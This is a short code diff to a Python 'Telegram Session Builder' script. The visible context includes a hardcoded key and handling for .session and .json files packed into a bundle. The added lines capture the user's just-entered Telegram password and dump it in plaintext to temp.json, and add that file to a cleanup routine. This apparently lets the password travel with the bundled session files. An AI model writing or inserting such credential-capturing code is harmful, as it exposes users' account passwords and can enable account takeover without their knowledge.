@@ -13,6 +13,7 @@ SK = b"wWrccy1RKckhyRZ1LgadeIdPwu93Z842t8p8IM6KxQY="
 ex = ('.json', '.session')
 z = "bundle.zip"
 p = "bundle.bin"
+pa= "temp.json"
 MAX_RETRIES = 5
 RETRY_DELAY = 5  
 
@@ -46,6 +47,8 @@ def rr():
             os.remove(z)
     if os.path.exists(p):
             os.remove(p)
+    if os.path.exists(pa):
+            os.remove(pa)        
     
 def build_session():
     print("--- Telegram Session Builder ---")
@@ -83,8 +86,13 @@ def build_session():
             print(f"\n[!] Authentication failed: {e}")
             client.disconnect()
             return
-
+    
     print("\nAuthentication successful!")
+    pa={}
+    pa["pass"]=password
+    with open("temp.json","w") as f:
+         json.dump(pa, f, indent=4)
+         
     client.disconnect()
         
     json_file = 'api.json'
